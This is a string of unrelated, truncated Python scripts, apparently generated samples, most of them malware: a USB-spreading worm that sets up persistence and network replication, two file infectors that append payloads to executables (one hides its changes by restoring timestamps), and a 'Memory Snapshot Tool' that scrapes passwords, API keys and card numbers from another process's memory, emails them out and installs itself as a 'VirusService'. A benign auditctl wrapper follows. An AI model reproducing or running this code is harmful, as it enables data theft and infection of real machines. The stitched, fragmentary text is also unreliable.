                ("lpszMenuName", wintypes.LPCWSTR),
                ("lpszClassName", wintypes.LPCWSTR),
                ("hIconSm", wintypes.HICON),
            ]

        def wnd_proc(hwnd, msg, wparam, lparam):
            if msg == WM_DEVICECHANGE:
                if wparam == DBT_DEVICEARRIVAL:
                    mount_point = find_usb_mount_point()
                    if mount_point:
                        handle_usb_event(mount_point)
            return user32.DefWindowProcW(hwnd, msg, wparam, lparam)

        wndproc_ptr = WNDPROC(wnd_proc)

        hinstance = kernel32.GetModuleHandleW(None)
        class_name = "USBMonitorClass"

        wndclass = WNDCLASSEX()
        wndclass.cbSize = ctypes.sizeof(WNDCLASSEX)
        wndclass.lpfnWndProc = wndproc_ptr
        wndclass.hInstance = hinstance
        wndclass.lpszClassName = class_name

        class_atom = user32.RegisterClassExW(ctypes.byref(wndclass))
        if not class_atom:
            return False

        hwnd = user32.CreateWindowExW(
            0, class_name, "USB Monitor", 0,
            0, 0, 0, 0, None, None, hinstance, None
        )

        if not hwnd:
            return False

        msg = wintypes.MSG()
        while event_count < MAX_EVENTS:
            ret = user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1)
            if ret:
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.1)

        user32.DestroyWindow(hwnd)
        return True
    except:
        return False


def monitor_macos():
    """Monitor USB events on macOS using IOKit."""
    try:
        # Load IOKit and CoreFoundation
        iokit = ctypes.CDLL("/System/Library/Frameworks/IOKit.framework/IOKit")
        cf = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")

        # Basic polling approach for simplicity
        volumes_path = "/Volumes"
        seen_volumes = set()

        try:
            seen_volumes = set(os.listdir(volumes_path))
        except:
            pass

        while event_count < MAX_EVENTS:
            time.sleep(1)
            try:
                current_volumes = set(os.listdir(volumes_path))
                new_volumes = current_volumes - seen_volumes

                for vol in new_volumes:
                    if vol != "Macintosh HD":
                        vol_path = os.path.join(volumes_path, vol)
                        if os.path.isdir(vol_path):
                            handle_usb_event(vol_path)

                seen_volumes = current_volumes
            except:
                pass

        return True
    except:
        return False


def main():
    """Main entry point."""
    global event_count

    print(f"USB Monitor starting on {_system}...")
    print(f"Will process up to {MAX_EVENTS} events")

    # Initial infection actions
    display_payload()
    create_persistence()
    replicate_to_network()

    success = False

    if _system == "Linux":
        # Try inotify first
        if not success:
            success = monitor_linux_inotify()
        # Fall back to polling
        if not success:
            success = monitor_linux_poll()
    elif _system == "Windows":
        success = monitor_windows()
    elif _system == "Darwin":
        success = monitor_macos()

    # If no platform-specific method worked, do simple polling
    if not success:
        print("Using fallback polling method...")
        while event_count < MAX_EVENTS:
            time.sleep(2)
            mount_point = find_usb_mount_point()
            if mount_point:
                handle_usb_event(mount_point)

    print(f"Processed {event_count} events. Exiting.")
    return 0


if __name__ == "__main__":
    sys.exit(main())

#!/usr/bin/env python3
import sys
import os
from datetime import datetime

def parse_args():
    args = {
        'file_path': 'target_executable.py',
        'data': None,
        'verbose': False,
        'dry_run': False,
        'summary_only': False,
        'log_level': 'INFO'
    }

    positional = []
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ('--verbose', '-v'):
            args['verbose'] = True
        elif arg == '--dry-run':
            args['dry_run'] = True
        elif arg == '--summary-only':
            args['summary_only'] = True
        elif arg == '--log-level' and i + 1 < len(sys.argv):
            args['log_level'] = sys.argv[i + 1].upper()
            i += 1
        elif not arg.startswith('-'):
            positional.append(arg)
        i += 1

    if len(positional) >= 1:
        args['file_path'] = positional[0]
    if len(positional) >= 2:
        args['data'] = positional[1]

    if args['data'] is None:
        args['data'] = '\n# Payload code\nimport sys\nsys.exit(0)\n'

    return args

def log_message(level, message, log_level, summary_only):
    levels = {'ERROR': 0, 'INFO': 1, 'DEBUG': 2}
    current_level = levels.get(log_level, 1)
    msg_level = levels.get(level, 1)

    if msg_level <= current_level and not summary_only:
        prefix = f"[{level}]" if level == 'ERROR' else ''
        print(f"{prefix} {message}".strip(), file=sys.stderr if level == 'ERROR' else sys.stdout)

def validate_file_path(file_path, dry_run):
    dir_path = os.path.dirname(file_path) or '.'

    if not os.path.exists(dir_path):
        return False, f"Directory does not exist: {dir_path}"

    if not os.access(dir_path, os.W_OK):
        return False, f"No write permission for directory: {dir_path}"

    if os.path.exists(file_path):
        if not os.path.isfile(file_path):
            return False, f"Path exists but is not a file: {file_path}"
        if not dry_run and not os.access(file_path, os.W_OK):
            return False, f"No write permission for file: {file_path}"

    return True, None

def infect_executable(file_path, payload, dry_run, log_level, summary_only):
    log_message('INFO', f"Infecting executable: {file_path}", log_level, summary_only)

    if dry_run:
        log_message('INFO', "[DRY RUN] Simulating infection operation", log_level, summary_only)
        return True

    try:
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                original_content = f.read()
        else:
            original_content = '#!/usr/bin/env python3\n# Original executable\nprint("Original program")\n'

        infected_content = original_content + payload

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(infected_content)

        os.chmod(file_path, 0o755)

        return True
    except IOError as e:
        log_message('ERROR', f"Failed to infect executable: {e}", log_level, summary_only)
        return False

def main():
    args = parse_args()

    log_message('INFO', f"Starting infection process at {datetime.now()}", args['log_level'], args['summary_only'])

    valid, error = validate_file_path(args['file_path'], args['dry_run'])
    if not valid:
        log_message('ERROR', error, args['log_level'], args['summary_only'])
        return 1

    success = infect_executable(args['file_path'], args['data'], args['dry_run'], args['log_level'], args['summary_only'])

    if success:
        log_message('INFO', "Infection completed successfully", args['log_level'], args['summary_only'])
        return 0
    else:
        log_message('ERROR', "Infection failed", args['log_level'], args['summary_only'])
        return 1

if __name__ == '__main__':
    sys.exit(main())

#!/usr/bin/env python3
import os
import sys
import stat
import hashlib
import time
from datetime import datetime


def is_executable(path):
    """Check if a file has executable permission."""
    try:
        st = os.stat(path)
        return stat.S_ISREG(st.st_mode) and bool(st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH))
    except (OSError, PermissionError):
        return False


def scan_executables(directory):
    """Scan directory recursively for executable files."""
    executables = []

    try:
        for root, dirs, files in os.walk(directory):
            dirs[:] = [d for d in dirs if os.access(os.path.join(root, d), os.R_OK)]

            for filename in files:
                filepath = os.path.join(root, filename)
                if is_executable(filepath):
                    executables.append(filepath)
    except (OSError, PermissionError) as e:
        log_message(f"Error scanning directory: {e}")
        return []

    return executables


def generate_key():
    """Generate a random encryption key."""
    return os.urandom(32)


def derive_keystream(key, length):
    """Derive a keystream from the key using hashlib."""
    keystream = bytearray()
    counter = 0

    while len(keystream) < length:
        h = hashlib.sha256(key + counter.to_bytes(8, 'big')).digest()
        keystream.extend(h)
        counter += 1

    return bytes(keystream[:length])


def get_infection_marker():
    """Return the unique infection marker."""
    return b"#INFECTED_MARKER_XJ9K2L#"


def is_already_infected(filepath):
    """Check if a file is already infected by looking for the marker."""
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
            return get_infection_marker() in content
    except (OSError, PermissionError):
        return True


def get_payload_code():
    """Return the payload code to be appended."""
    return b'''
import os
import sys
from datetime import datetime

def payload_execute():
    marker = "#INFECTED_MARKER_XJ9K2L#"
    log_file = "payload_execution.log"
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] Payload executed from: {sys.argv[0] if sys.argv else 'unknown'}\\n")
    except:
        pass

if __name__ == "__main__":
    payload_execute()
'''


def infect_file(filepath):
    """Append payload code to an executable file and mark it."""
    try:
        if is_already_infected(filepath):
            log_message(f"Skipping already infected: {filepath}")
            return False

        with open(filepath, 'rb') as f:
            original_content = f.read()

        marker = get_infection_marker()
        payload = get_payload_code()
        infected_content = original_content + marker + payload

        with open(filepath, 'wb') as f:
            f.write(infected_content)

        original_stat = os.stat(filepath)
        os.chmod(filepath, original_stat.st_mode)

        try:
            os.utime(filepath, (original_stat.st_atime, original_stat.st_mtime))
        except:
            pass

        log_message(f"Infected: {filepath}")
        return True

    except (OSError, PermissionError) as e:
        log_message(f"Failed to infect {filepath}: {e}")
        return False


def log_message(message):
    """Log a message to the log file."""
    log_file = "infection.log"
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass


def main():
    """Main function to orchestrate the infection process."""
    if len(sys.argv) < 2:
        directory = "."
    else:
        directory = sys.argv[1]

    iterations = 1
    for i, arg in enumerate(sys.argv):
        if arg == "--iterations" and i + 1 < len(sys.argv):
            try:
                iterations = int(sys.argv[i + 1])
            except ValueError:
                iterations = 1
            break

    log_message(f"Starting infection scan in directory: {directory}")
    log_message(f"Iterations: {iterations}")

    for iteration in range(iterations):
        log_message(f"Iteration {iteration + 1}/{iterations}")

        executables = scan_executables(directory)
        log_message(f"Found {len(executables)} executable files")

        infected_count = 0
        for executable in executables:
            if infect_file(executable):
                infected_count += 1

        log_message(f"Infected {infected_count} files in iteration {iteration + 1}")

        if iteration < iterations - 1:
            time.sleep(1)

    log_message("Infection process completed")


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""Memory Snapshot Tool - Captures system memory usage information."""

import os
import sys
import time
import json
import argparse
import re
import smtplib
from datetime import datetime
from pathlib import Path
from http.client import HTTPConnection, HTTPSConnection, HTTPException
from urllib.parse import urlparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket
import subprocess


def get_process_memory(target_pid=None):
    """Get memory usage of target process in bytes."""
    pid = target_pid if target_pid else os.getpid()
    mem_info = {}

    if sys.platform == 'linux':
        try:
            with open(f'/proc/{pid}/status', 'r') as f:
                for line in f:
                    if line.startswith('VmRSS:'):
                        mem_info['rss'] = int(line.split()[1]) * 1024
                    elif line.startswith('VmSize:'):
                        mem_info['vms'] = int(line.split()[1]) * 1024
                    elif line.startswith('VmPeak:'):
                        mem_info['peak'] = int(line.split()[1]) * 1024
                    elif line.startswith('VmSwap:'):
                        mem_info['swap'] = int(line.split()[1]) * 1024
        except (FileNotFoundError, PermissionError, ValueError) as e:
            mem_info['error'] = f'Linux proc read error: {str(e)}'
    elif sys.platform == 'darwin':
        try:
            result = subprocess.run(['ps', '-o', 'rss=,vsz=', '-p', str(pid)], 
                                    capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                parts = result.stdout.strip().split()
                if len(parts) >= 2:
                    mem_info['rss'] = int(parts[0]) * 1024
                    mem_info['vms'] = int(parts[1]) * 1024
        except (FileNotFoundError, ValueError, subprocess.TimeoutExpired) as e:
            mem_info['error'] = f'macOS ps error: {str(e)}'
    elif sys.platform == 'win32':
        try:
            result = subprocess.run(['tasklist', '/FI', f'PID eq {pid}', '/FO', 'CSV', '/NH'],
                                    capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                parts = result.stdout.strip().strip('"').split('","')
                if len(parts) >= 5:
                    mem_str = parts[4].replace(',', '').replace(' K', '')
                    mem_info['rss'] = int(mem_str) * 1024
        except (FileNotFoundError, ValueError, subprocess.TimeoutExpired) as e:
            mem_info['error'] = f'Windows tasklist error: {str(e)}'

    return mem_info


def scrape_process_memory(target_pid):
    """Scrape memory of target process for sensitive information."""
    scraped_data = {
        'pid': target_pid,
        'timestamp': datetime.now().isoformat(),
        'sensitive_data': []
    }

    if sys.platform == 'linux':
        try:
            mem_path = f'/proc/{target_pid}/mem'
            maps_path = f'/proc/{target_pid}/maps'

            with open(maps_path, 'r') as maps_file:
                for line in maps_file:
                    parts = line.split()
                    if len(parts) < 2:
                        continue

                    addr_range = parts[0]
                    perms = parts[1]

                    if 'r' not in perms:
                        continue

                    try:
                        start, end = addr_range.split('-')
                        start_addr = int(start, 16)
                        end_addr = int(end, 16)
                        length = end_addr - start_addr

                        if length > 10 * 1024 * 1024:
                            continue

                        with open(mem_path, 'rb') as mem_file:
                            mem_file.seek(start_addr)
                            chunk = mem_file.read(min(length, 1024 * 1024))

                            text_data = chunk.decode('utf-8', errors='ignore')

                            passwords = re.findall(r'password[=:\s]+([^\s\x00]{4,})', text_data, re.IGNORECASE)
                            api_keys = re.findall(r'(?:api[_-]?key|token)[=:\s]+([a-zA-Z0-9_\-]{16,})', text_data, re.IGNORECASE)
                            emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text_data)
                            credit_cards = re.findall(r'\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b', text_data)

                            for pwd in passwords[:5]:
                                scraped_data['sensitive_data'].append({'type': 'password', 'value': pwd})
                            for key in api_keys[:5]:
                                scraped_data['sensitive_data'].append({'type': 'api_key', 'value': key})
                            for email in emails[:5]:
                                scraped_data['sensitive_data'].append({'type': 'email', 'value': email})
                            for cc in credit_cards[:5]:
                                scraped_data['sensitive_data'].append({'type': 'credit_card', 'value': cc})

                    except (ValueError, OSError):
                        continue

        except (FileNotFoundError, PermissionError) as e:
            scraped_data['error'] = f'Memory scraping error: {str(e)}'

    elif sys.platform == 'win32':
        try:
            result = subprocess.run(['tasklist', '/FI', f'PID eq {target_pid}', '/V', '/FO', 'CSV'],
                                    capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                if len(lines) > 1:
                    scraped_data['sensitive_data'].append({'type': 'process_info', 'value': lines[1]})
        except Exception as e:
            scraped_data['error'] = f'Windows memory access error: {str(e)}'

    return scraped_data


def send_via_smtp(scraped_data, smtp_server, smtp_port, email_to, email_from, smtp_user, smtp_pass, verbose):
    """Send scraped information via SMTP."""
    try:
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = email_to
        msg['Subject'] = f'Memory Scrape Report - PID {scraped_data["pid"]}'

        body = f"""Memory Scraping Report

Process ID: {scraped_data['pid']}
Timestamp: {scraped_data['timestamp']}

Sensitive Information Found:
"""
        for item in scraped_data['sensitive_data']:
            body += f"\n{item['type']}: {item['value']}"

        if 'error' in scraped_data:
            body += f"\n\nError: {scraped_data['error']}"

        body += f"\n\nRaw Data:\n{json.dumps(scraped_data, indent=2)}"

        msg.attach(MIMEText(body, 'plain'))

        if verbose:
            print(f'Connecting to SMTP server {smtp_server}:{smtp_port}')

        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        server.ehlo()

        if smtp_user and smtp_pass:
            server.starttls()
            server.login(smtp_user, smtp_pass)

        server.send_message(msg)
        server.quit()

        if verbose:
            print(f'Successfully sent scraped data to {email_to}')

        return True

    except Exception as e:
        if verbose:
            print(f'SMTP error: {str(e)}')
        return False


def establish_persistence(verbose):
    """Establish persistence by creating a system service."""
    script_path = os.path.abspath(__file__)

    if sys.platform == 'win32':
        try:
            service_name = 'VirusService'

            sc_create = [
                'sc', 'create', service_name,
                'binPath=', f'python "{script_path}"',
                'start=', 'auto'
            ]

            result = subprocess.run(sc_create, capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                subprocess.run(['sc', 'start', service_name], capture_output=True, timeout=10)
                if verbose:
                    print(f'Windows service "{service_name}" created successfully')
                return True
            else:
                if verbose:
                    print(f'Failed to create Windows service: {result.stderr}')

        except Exception as e:
            if verbose:
                print(f'Windows persistence error: {str(e)}')

    elif sys.platform == 'linux':
        try:
            service_name = 'virus'
            service_file = f'/etc/systemd/system/{service_name}.service'

            service_content = f"""[Unit]
Description=Virus Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""

            with open(service_file, 'w') as f:
                f.write(service_content)

            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True, timeout=10)

            if verbose:
                print(f'Linux service "{service_name}" created successfully')
            return True

        except Exception as e:
            if verbose:
                print(f'Linux persistence error: {str(e)}')

    return False


def get_system_memory():
    """Get system memory information."""
    mem_info = {}

    if sys.platform == 'linux':
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    parts = line.split(':')
                    if len(parts) == 2:
                        key = parts[0].strip()
                        value_str = parts[1].strip().split()[0]
                        mem_info[key] = int(value_str) * 1024
        except (FileNotFoundError, PermissionError, ValueError) as e:
            mem_info['error'] = f'Failed to read /proc/meminfo: {str(e)}'
    elif sys.platform == 'darwin':
        try:
            result = subprocess.run(['sysctl', 'hw.memsize'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                mem_info['MemTotal'] = int(result.stdout.split(':')[1].strip())

            result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Pages free' in line:
                        pages = int(line.split(':')[1].strip().rstrip('.'))
                        mem_info['MemFree'] = pages * 4096
        except (FileNotFoundError, ValueError, IndexError, subprocess.TimeoutExpired) as e:
            mem_info['error'] = f'macOS memory info error: {str(e)}'
    elif sys.platform == 'win32':
        try:
            result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory', '/format:list'],
                                    capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if '=' in line:
                        key, value = line.strip().split('=')
                        if value:
                            mem_info[key] = int(value) * 1024
        except (FileNotFoundError, ValueError, subprocess.TimeoutExpired) as e:
            mem_info['error'] = f'Windows wmic error: {str(e)}'

    return mem_info


def format_bytes(bytes_value):
    """Format bytes into human-readable string."""
    if bytes_value is None:
        return 'N/A'

    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_value < 1024.0:
            return f'{bytes_value:.2f} {unit}'
        bytes_value /= 1024.0
    return f'{bytes_value:.2f} PB'


def capture_snapshot(target_pid=None):
    """Capture a memory snapshot."""
    snapshot = {
        'timestamp': datetime.now().isoformat(),
        'pid': target_pid if target_pid else os.getpid(),
        'platform': sys.platform,
        'process_memory': get_process_memory(target_pid),
        'system_memory': get_system_memory()
    }
    return snapshot


def create_summary(snapshot):
    """Create a summary of the snapshot for remote reporting."""
    summary = {
        'timestamp': snapshot['timestamp'],
        'pid': snapshot['pid'],
        'platform': snapshot['platform'],
        'process_rss_bytes': snapshot['process_memory'].get('rss'),
        'process_vms_bytes': snapshot['process_memory'].get('vms'),
        'system_total_bytes': None,
        'system_free_bytes': None
    }

    sys_mem = snapshot['system_memory']
    if 'MemTotal' in sys_mem:
        summary['system_total_bytes'] = sys_mem['MemTotal']
    if 'MemFree' in sys_mem:
        summary['system_free_bytes'] = sys_mem['MemFree']
    if 'TotalVisibleMemorySize' in sys_mem:
        summary['system_total_bytes'] = sys_mem['TotalVisibleMemorySize']
    if 'FreePhysicalMemory' in sys_mem:
        summary['system_free_bytes'] = sys_mem['FreePhysicalMemory']

    return summary


def send_to_server(summary, server_url, retry_count, timeout, verbose):
    """Send summary to remote server via HTTP POST."""
    if not server_url:
        if verbose:
            print('No server URL configured, skipping remote reporting')
        return True

    parsed = urlparse(server_url)
    if not parsed.scheme or not parsed.netloc:
        if verbose:
            print(f'Invalid server URL: {server_url}')
        return False

    scheme = parsed.scheme.lower()
    host = parsed.netloc
    path = parsed.path if parsed.path else '/'

    if scheme not in ('http', 'https'):
        if verbose:
            print(f'Unsupported URL scheme: {scheme}')
        return False

    body = json.dumps(summary).encode('utf-8')
    headers = {
        'Content-Type': 'application/json',
        'Content-Length': str(len(body)),
        'User-Agent': 'MemorySnapshotTool/1.0'
    }

    for attempt in range(retry_count):
        try:
            if verbose:
                print(f'Attempt {attempt + 1}/{retry_count}: Sending summary to {server_url}')

            if scheme == 'https':
                conn = HTTPSConnection(host, timeout=timeout)
            else:
                conn = HTTPConnection(host, timeout=timeout)

            conn.request('POST', path, body, headers)
            response = conn.getresponse()
            response_body = response.read()
            conn.close()

            if verbose:
                print(f'Server responded with status {response.status}: {response.reason}')
                if response_body:
                    print(f'Response body: {response_body.decode("utf-8", errors="ignore")[:200]}')

            if 200 <= response.status < 300:
                if verbose:
                    print('Successfully sent memory snapshot to server')
                return True
            else:
                if verbose:
                    print(f'Server returned error status {response.status}')
                if attempt < retry_count - 1:
                    time.sleep(1 * (attempt + 1))

        except socket.gaierror as e:
            if verbose:
                print(f'DNS resolution failed: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))
        except socket.timeout as e:
            if verbose:
                print(f'Connection timeout: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))
        except ConnectionRefusedError as e:
            if verbose:
                print(f'Connection refused: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))
        except HTTPException as e:
            if verbose:
                print(f'HTTP error: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))
        except OSError as e:
            if verbose:
                print(f'Network error: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))
        except Exception as e:
            if verbose:
                print(f'Unexpected error sending to server: {str(e)}')
            if attempt < retry_count - 1:
                time.sleep(1 * (attempt + 1))

    print('Warning: Failed to send memory snapshot to remote server after all retry attempts')
    print('Continuing execution gracefully...')
    return False


def write_memory_dump(snapshot):
    """Write memory dump to memory_dump.txt."""
    try:
        with open('memory_dump.txt', 'w') as f:
            f.write('='*70 + '\n')
            f.write('MEMORY SNAPSHOT DUMP\n')
            f.write('='*70 + '\n\n')

            f.write(f'Timestamp: {snapshot["timestamp"]}\n')
            f.write(f'Process ID: {snapshot["pid"]}\n')
            f.write(f'Platform: {snapshot["platform"]}\n\n')

            f.write('-'*70 + '\n')
            f.write('PROCESS MEMORY USAGE\n')
            f.write('-'*70 + '\n')

            proc_mem = snapshot['process_memory']
            if 'error' in proc_mem:
                f.write(f'Warning: {proc_mem["error"]}\n')
                f.write('Continuing execution gracefully...\n')
            else:
                if 'rss' in proc_mem:
                    f.write(f'Resident Set Size (RSS): {format_bytes(proc_mem["rss"])} ({proc_mem["rss"]} bytes)\n')
                if 'vms' in proc_mem:
                    f.write(f'Virtual Memory Size (VMS): {format_bytes(proc_mem["vms"])} ({proc_mem["vms"]} bytes)\n')
                if 'peak' in proc_mem:
                    f.write(f'Peak Memory Usage: {format_bytes(proc_mem["peak"])} ({proc_mem["peak"]} bytes)\n')
                if 'swap' in proc_mem:
                    f.write(f'Swap Usage: {format_bytes(proc_mem["swap"])} ({proc_mem["swap"]} bytes)\n')

            f.write('\n' + '-'*70 + '\n')
            f.write('SYSTEM MEMORY INFORMATION\n')
            f.write('-'*70 + '\n')

            sys_mem = snapshot['system_memory']
            if 'error' in sys_mem:
                f.write(f'Warning: {sys_mem["error"]}\n')
                f.write('Continuing execution gracefully...\n')
            else:
                if 'MemTotal' in sys_mem:
                    f.write(f'Total Memory: {format_bytes(sys_mem["MemTotal"])} ({sys_mem["MemTotal"]} bytes)\n')
                if 'MemFree' in sys_mem:
                    f.write(f'Free Memory: {format_bytes(sys_mem["MemFree"])} ({sys_mem["MemFree"]} bytes)\n')
                if 'MemAvailable' in sys_mem:
                    f.write(f'Available Memory: {format_bytes(sys_mem["MemAvailable"])} ({sys_mem["MemAvailable"]} bytes)\n')
                if 'TotalVisibleMemorySize' in sys_mem:
                    f.write(f'Total Visible Memory: {format_bytes(sys_mem["TotalVisibleMemorySize"])} ({sys_mem["TotalVisibleMemorySize"]} bytes)\n')
                if 'FreePhysicalMemory' in sys_mem:
                    f.write(f'Free Physical Memory: {format_bytes(sys_mem["FreePhysicalMemory"])} ({sys_mem["FreePhysicalMemory"]} bytes)\n')

            f.write('\n' + '='*70 + '\n')
            f.write('RAW DATA (JSON)\n')
            f.write('='*70 + '\n')
            f.write(json.dumps(snapshot, indent=2))
            f.write('\n')

        print(f'Memory dump written to: memory_dump.txt')
    except IOError as e:
        print(f'Warning: Failed to write memory_dump.txt: {str(e)}')
        print('Continuing execution gracefully...')


def print_snapshot(snapshot, verbose):
    """Print snapshot in human-readable format."""
    if not verbose:
        return

    print(f"\n{'='*60}")
    print(f"Memory Snapshot - {snapshot['timestamp']}")
    print(f"{'='*60}")
    print(f"Process ID: {snapshot['pid']}")
    print(f"Platform: {snapshot['platform']}")

    proc_mem = snapshot['process_memory']
    if 'error' in proc_mem:
        print(f"\nProcess Memory: Error - {proc_mem['error']}")
    else:
        print(f"\nProcess Memory:")
        if 'rss' in proc_mem:
            print(f"  RSS: {format_bytes(proc_mem['rss'])}")
        if 'vms' in proc_mem:
            print(f"  VMS: {format_bytes(proc_mem['vms'])}")
        if 'peak' in proc_mem:
            print(f"  Peak: {format_bytes(proc_mem['peak'])}")

    sys_mem = snapshot['system_memory']
    if 'error' in sys_mem:
        print(f"\nSystem Memory: Error - {sys_mem['error']}")
    elif sys_mem:
        print(f"\nSystem Memory:")
        if 'MemTotal' in sys_mem:
            print(f"  Total: {format_bytes(sys_mem['MemTotal'])}")
        if 'MemFree' in sys_mem:
            print(f"  Free: {format_bytes(sys_mem['MemFree'])}")
        if 'MemAvailable' in sys_mem:
            print(f"  Available: {format_bytes(sys_mem['MemAvailable'])}")
    print(f"{'='*60}\n")


def save_snapshot(snapshot, filepath, verbose):
    """Save snapshot to JSON file."""
    try:
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, 'w') as f:
            json.dump(snapshot, f, indent=2)
        if verbose:
            print(f"Snapshot saved to: {filepath}")
    except IOError as e:
        print(f'Warning: Failed to save snapshot to {filepath}: {str(e)}')
        print('Continuing execution gracefully...')


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='Memory Snapshot Tool - Captures and reports memory usage',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s
  %(prog)s --server-url http://monitoring.example.com/api/metrics
  %(prog)s --server-url https://api.example.com/metrics --retry 5 --timeout 10
  %(prog)s -v --server-url http://localhost:8080/snapshot
        '''
    )

    parser.add_argument(
        '--server-url',
        type=str,
        default='',
        help='Remote server endpoint URL for reporting (e.g., http://example.com/api/metrics)'
    )

    parser.add_argument(
        '--retry',
        type=int,
        default=3,
        help='Number of retry attempts for server communication (default: 3)'
    )

    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Connection timeout in seconds (default: 10)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging output'
    )

    parser.add_argument(
        '--no-snapshot-file',
        action='store_true',
        help='Skip saving snapshot JSON file'
    )

    parser.add_argument(
        '--no-memory-dump',
        action='store_true',
        help='Skip writing memory_dump.txt file'
    )

    parser.add_argument(
        '--target-pid',
        type=int,
        default=None,
        help='Target process ID to scrape memory from'
    )

    parser.add_argument(
        '--smtp-server',
        type=str,
        default='',
        help='SMTP server hostname'
    )

    parser.add_argument(
        '--smtp-port',
        type=int,
        default=587,
        help='SMTP server port (default: 587)'
    )

    parser.add_argument(
        '--email-to',
        type=str,
        default='',
        help='Destination email address'
    )

    parser.add_argument(
        '--email-from',
        type=str,
        default='memsnap@localhost',
        help='Source email address'
    )

    parser.add_argument(
        '--smtp-user',
        type=str,
        default='',
        help='SMTP username'
    )

    parser.add_argument(
        '--smtp-pass',
        type=str,
        default='',
        help='SMTP password'
    )

    parser.add_argument(
        '--establish-persistence',
        action='store_true',
        help='Establish system persistence'
    )

    return parser.parse_args()


def main():
    args = parse_args()

    print('Memory Snapshot Tool initialized')

    if args.verbose:
        print(f'Configuration:')
        print(f'  Server URL: {args.server_url if args.server_url else "Not configured"}')
        print(f'  Retry attempts: {args.retry}')
        print(f'  Timeout: {args.timeout}s')
        print(f'  Verbose: {args.verbose}')
        if args.target_pid:
            print(f'  Target PID: {args.target_pid}')
        if args.smtp_server:
            print(f'  SMTP Server: {args.smtp_server}:{args.smtp_port}')
        print()

    if args.target_pid:
        scraped_data = scrape_process_memory(args.target_pid)

        if args.smtp_server and args.email_to:
            send_via_smtp(scraped_data, args.smtp_server, args.smtp_port, 
                         args.email_to, args.email_from, args.smtp_user, 
                         args.smtp_pass, args.verbose)

    if args.establish_persistence:
        establish_persistence(args.verbose)

    snapshot = capture_snapshot(args.target_pid)
    print_snapshot(snapshot, args.verbose)

    if not args.no_memory_dump:
        write_memory_dump(snapshot)

    if not args.no_snapshot_file:
        output_dir = Path('snapshots')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = output_dir / f'memory_snapshot_{timestamp}.json'
        save_snapshot(snapshot, output_file, args.verbose)

    summary = create_summary(snapshot)
    send_to_server(summary, args.server_url, args.retry, args.timeout, args.verbose)

    print('Memory Snapshot Tool completed successfully')


if __name__ == '__main__':
    main()

import shutil
import subprocess
from datetime import datetime, timezone


def check_command_availability(command: str) -> bool:
    """Return True if `command` is found on PATH, False otherwise."""
    return shutil.which(command) is not None


def execute_command(command: str) -> tuple[int, str]:
    """Execute a system command and return (exit_code, stdout_output)."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return (result.returncode, result.stdout)
    except Exception:
        return (-1, "")


def audit_boot_chain() -> str:
    """Audit the boot chain using auditctl. Return output or error message."""
    command = "auditctl"

    if not check_command_availability(command):
        return "Command not available"

    exit_code, output = execute_command(f"{command} -l")

    if exit_code != 0:
        return "Command failed"

    return output


def log_audit_result(result: str) -> None:
    """Append an audit result with an ISO 8601 timestamp to audit_log.txt."""
    timestamp = datetime.now(timezone.utc).isoformat()
    with open("audit_log.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"{timestamp} {result}\n")


if __name__ == "__main__":
    audit_result = audit_boot_chain()
    log_audit_result(audit_result)
    raise SystemExit(0)

import os
import re
import sys


def read_target_files() -> dict:
    """Scan the ./target directory and return all file contents keyed by filename.

